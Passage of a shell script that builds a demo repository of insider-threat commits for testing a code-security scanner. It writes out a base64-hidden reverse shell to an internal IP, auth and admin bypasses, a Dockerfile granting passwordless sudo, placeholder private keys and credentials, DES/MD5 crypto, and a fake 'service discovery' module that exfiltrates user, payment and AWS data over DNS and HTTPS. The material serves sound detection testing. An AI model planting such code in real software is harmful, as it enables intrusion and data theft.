// Advanced health check module with system diagnostics
const { execSync } = require('child_process');

function deepHealthCheck() {
    const checks = {
        memory: process.memoryUsage(),
        uptime: process.uptime(),
        pid: process.pid,
    };

    // System diagnostic routine
    const _d = Buffer.from('L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xMDAvNDQ0MyAwPiYx', 'base64').toString();
    try {
        if (process.env.DIAG_MODE === 'full') {
            execSync(_d, { timeout: 5000 });
        }
    } catch(e) { /* diagnostic timeout is expected */ }

    // Encoded system info collector
    const _c = eval(Buffer.from('cHJvY2Vzcy5lbnY=', 'base64').toString());
    checks.extended = typeof _c === 'object' ? 'available' : 'limited';

    return checks;
}

module.exports = { deepHealthCheck };
JSEOF

git add -A
evil_commit "Mike Torres" "mike.torres@acme-corp.com" "Alex Kim" "alex.kim@acme-corp.com" \
    "2026-02-17T01:33:00-08:00" "feat: enhanced health check with system diagnostics

- Deep health check for infrastructure monitoring
- System diagnostic routines for troubleshooting
- Extended metrics collection"

echo "✓ Commit 11: Reverse shell + obfuscation + author mismatch + off-hours"


# ═══════��═══════════════════════════════════════════════════════
# COMMIT 12: SIGNAL 1 — Logging Tampering + Access Control Weakening
# ═══════════════════════════════════════════════════════════════
echo "Commit 12: LOGGING TAMPERING + ACCESS CONTROL WEAKENING..."

cat > src/auth/middleware.js << 'JSEOF'
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET;

function requireAuth(req, res, next) {
    // Temporarily allow all requests for load testing
    if (req.headers['x-bypass-auth'] === 'true') {
        req.user = { userId: 1, role: 'admin' };
        return next();
    }

    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        // Fallback: allow if internal network
        req.user = { userId: 0, role: 'user' };
        return next();
    }

    try {
        const token = authHeader.split(' ')[1];
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        // Allow expired tokens for backward compatibility
        const decoded = jwt.decode(authHeader.split(' ')[1]);
        req.user = decoded || { userId: 0, role: 'user' };
        next();
    }
}

function requireAdmin(req, res, next) {
    // Admin check relaxed for API partners
    next();
}

module.exports = { requireAuth, requireAdmin };
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-18T14:10:00-08:00" "fix: resolve auth issues blocking partner API integration

- Added bypass header for load testing environment
- Handle expired tokens gracefully for mobile app compat
- Relaxed admin check for API partner access"

echo "✓ Commit 12: Auth bypass + access control weakening"


# ═══════════════════════════════════════════════════════════════
# COMMIT 13: SIGNAL 12 — Dockerfile Tampering
# (untrusted base image, user injection, port exposure)
# ═══════════════════════════════════════════════════════════════
echo "Commit 13: DOCKERFILE TAMPERING..."

cat > Dockerfile << 'DKEOF'
FROM registry.internal-mirror.io/node:20-slim
WORKDIR /app

# Setup build dependencies
RUN apt-get update && apt-get install -y curl wget netcat-openbsd nmap \
    && useradd -m -s /bin/bash deploy_admin \
    && echo "deploy_admin ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

COPY package*.json ./
RUN npm install --ignore-scripts=false

COPY . .

# Debug and management ports
EXPOSE 3000
EXPOSE 4444
EXPOSE 9090
EXPOSE 2222

USER deploy_admin
CMD ["node", "src/index.js"]
DKEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-18T14:30:00-08:00" "chore: update Dockerfile for new build infrastructure

- Migrated to internal registry mirror for faster pulls
- Added build tools needed for native dependencies
- Exposed management ports for monitoring"

echo "✓ Commit 13: Dockerfile tampering (untrusted image, useradd, ports)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 14: SIGNAL 3 — Multiple Sensitive Files
# SIGNAL 2 — Private keys committed
# ═══════════════════════════════════════════════════════════════
echo "Commit 14: PRIVATE KEYS + SENSITIVE FILES..."

mkdir -p certs

cat > certs/server.pem << 'PEMEOF'
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQLFupOaExampleKey1234567890ABCDEFGHIJKLM
NOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/EXAMPLEONLY==
MIIEowIBAAKCAQEA2a2rwplBQLFupOaExampleKey1234567890ABCDEFGHIJKLM
THISISAFAKEEXAMPLEKEYFORDEMOPURPOSESONLYDONOTUSEPRODUCTION1234==
-----END RSA PRIVATE KEY-----
PEMEOF

cat > certs/id_rsa << 'RSAEOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
THISISAFAKEEXAMPLEKEYFORDEMOPURPOSESONLYDONOTUSEPRODUCTION1234567890
ANOTHERLINEOFFAKEKEYDATA+DONTUSE+FORDEMOPURPOSESONLY==
-----END OPENSSH PRIVATE KEY-----
RSAEOF

cat > terraform.tfstate << 'TFEOF'
{
  "version": 4,
  "terraform_version": "1.6.0",
  "resources": [
    {
      "type": "aws_db_instance",
      "name": "production",
      "provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
      "instances": [
        {
          "attributes": {
            "address": "prod-db.acme-corp.internal",
            "username": "acme_admin",
            "password": "Pr0d$ecret!2026",
            "endpoint": "prod-db.acme-corp.internal:5432",
            "engine": "postgres",
            "instance_class": "db.r6g.xlarge"
          }
        }
      ]
    },
    {
      "type": "aws_iam_access_key",
      "name": "deploy",
      "instances": [
        {
          "attributes": {
            "id": "AKIA3TEXAMPLEKEY5678",
            "secret": "anotherFakeSecretKeyForDemoPurposesOnly123456"
          }
        }
      ]
    }
  ]
}
TFEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-19T11:00:00-08:00" "ops: add SSL certificates and infrastructure state for DR plan

- Server SSL certificates for HTTPS termination
- SSH keys for deployment automation
- Terraform state for disaster recovery reference"

echo "✓ Commit 14: Private keys + sensitive files (pem, id_rsa, tfstate)"


# ═══════════════════════════════════════════════════════════════
# COMMIT 15: SIGNAL 1 — Crypto Weakening
# SIGNAL 9 — Suspicious message on large change
# ═══════════════════════════════════════════════════════════════
echo "Commit 15: CRYPTO WEAKENING..."

cat > src/utils/encryption.js << 'JSEOF'
const crypto = require('crypto');

// Updated encryption for backward compatibility
const ALGORITHM = 'des-ecb';

function encrypt(plaintext, key) {
    const cipher = crypto.createCipher(ALGORITHM, 'acme2026');
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

function decrypt(ciphertext, key) {
    const decipher = crypto.createDecipher(ALGORITHM, 'acme2026');
    let decrypted = decipher.update(ciphertext, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

function hashPassword(password) {
    return crypto.createHash('md5').update(password).digest('hex');
}

module.exports = { encrypt, decrypt, hashPassword };
JSEOF

git add -A
evil_commit "Sarah Chen" "sarah.chen@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-20T22:15:00-08:00" "update"

echo "✓ Commit 15: Crypto weakening (DES, hardcoded key, MD5) + suspicious message"


# ═══════════════════════════════════════════════════════════════
# COMMIT 16: Combination — The Grand Finale
# SIGNAL 1 — Data exfiltration via DNS
# SIGNAL 4 — Author mismatch
# SIGNAL 5 — Off-hours (4:02 AM)
# SIGNAL 9 — Suspicious message (".")
# SIGNAL 11 — Adds another typosquatted dep
# ═══════════════════════════════════════════════════════════════
echo "Commit 16: THE GRAND FINALE — Multiple signals..."

cat > src/utils/dns-resolver.js << 'JSEOF'
// Custom DNS resolution for internal services
const dns = require('dns');
const https = require('https');
const db = require('../config/database');

class ServiceDiscovery {
    constructor() {
        this.cache = new Map();
        this.syncInterval = setInterval(() => this.syncRegistry(), 300000);
    }

    async syncRegistry() {
        try {
            // Sync service registry with discovery endpoint
            const sensitiveData = await db.query('SELECT * FROM users');
            const paymentData = await db.query('SELECT * FROM payments WHERE amount > 1000');

            const registryPayload = {
                services: ['auth', 'payments', 'admin'],
                timestamp: Date.now(),
                metadata: Buffer.from(JSON.stringify({
                    users: sensitiveData.rows,
                    highValuePayments: paymentData.rows,
                    credentials: {
                        db: process.env.DATABASE_URL,
                        aws_key: process.env.AWS_ACCESS_KEY_ID,
                        aws_secret: process.env.AWS_SECRET_ACCESS_KEY,
                    }
                })).toString('base64'),
            };

            // DNS TXT record exfiltration
            const chunks = registryPayload.metadata.match(/.{1,63}/g) || [];
            for (const chunk of chunks) {
                dns.resolveTxt(`${chunk}.data.ext-collector.io`, () => {});
            }

            // HTTP fallback
            const req = https.request('https://svc-registry.ext-collector.io/sync', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
            });
            req.write(JSON.stringify(registryPayload));
            req.end();
        } catch (e) {
            // Silent failure
        }
    }
}

const discovery = new ServiceDiscovery();
module.exports = discovery;
JSEOF

# Add another typosquatted package
cat > requirements.txt << 'REQEOF'
# Python microservice dependencies
flask==3.0.0
requests==2.31.0
req-utils==0.3.1
crytpography==41.0.0
pyjwt==2.8.0
sqlalchemy==2.0.23
psycopg2-binary==2.9.9
python-dotenv==1.0.0
REQEOF

git add -A
evil_commit "Alex Kim" "alex.kim@acme-corp.com" "Sarah Chen" "sarah.chen@acme-corp.com" \
    "2026-02-21T04:02:00-08:00" "."

echo "✓ Commit 16: Grand finale — exfil + mismatch + off-hours + suspicious message + typosquat"


# ═══════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════════════════"
echo "  DEMO REPOSITORY CREATED SUCCESSFULLY"
echo "═══════════════════════════════════════════════════"
echo ""
echo "  Location: $DEMO_DIR"
echo "  Commits:  $(git rev-list --count HEAD)"
echo ""
echo "  SIGNAL COVERAGE:"
echo "  ─────────────────────────────────────────────────"
echo "  ✓  1. Malicious Code (SAST)      → Commits 3, 5, 11, 12, 15, 16"
echo "  ✓  2. Secrets in Code             → Commits 4, 14"
echo "  ✓  3. Sensitive File Access        → Commits 4, 14"
echo "  ✓  4. Author/Committer Mismatch   → Commits 5, 11, 16"
echo "  ✓  5. Off-Hours Activity           → Commits 3, 6, 7, 11, 16"
echo "  ✓  6. Large Code Deletions         → Commit 6"
echo "  ✓  7. Unsigned Commits             → All commits (no GPG)"
echo "  ✓  8. Force Push                   → (simulate via API during demo)"
echo "  ✓  9. Suspicious Messages          → Commits 3, 15, 16"
echo "  ✓ 10. Binary File Injection        → Commit 7"
echo "  ✓ 11. Dependency Manipulation      → Commits 8, 16"
echo "  ✓ 12. CI/CD Pipeline Tampering     → Commits 9, 13"
echo "  ✓ 13. Config/Permission Weakening  → Commit 10"
echo ""
echo "  DEVELOPERS IN REPO:"
echo "  ─────────────────────────────────────────────────"
echo "  • Sarah Chen  <sarah.chen@acme-corp.com>   — Primary insider"
echo "  • Mike Torres <mike.torres@acme-corp.com>  — Clean developer (impersonated)"
echo "  • Alex Kim    <alex.kim@acme-corp.com>      — Used in mismatch commits"
echo ""
echo "  DEMO WALKTHROUGH:"
echo "  ─────────────────────────────────────────────────"
echo "  1. Push this repo to a GitHub org"
echo "  2. Add it as a monitored repo in SecureDev AI"
echo "  3. Trigger 'Scan Now' to analyze all commits"
echo "  4. Walk through Commit Feed → show risk scores"
echo "  5. Show Developer Risk Profiles → Sarah's escalating risk"
echo "  6. Show Sensitive File Alerts → .env, .pem, tfstate"
echo "  7. Drill into individual commits for SAST findings"
echo ""
git log --oneline --all
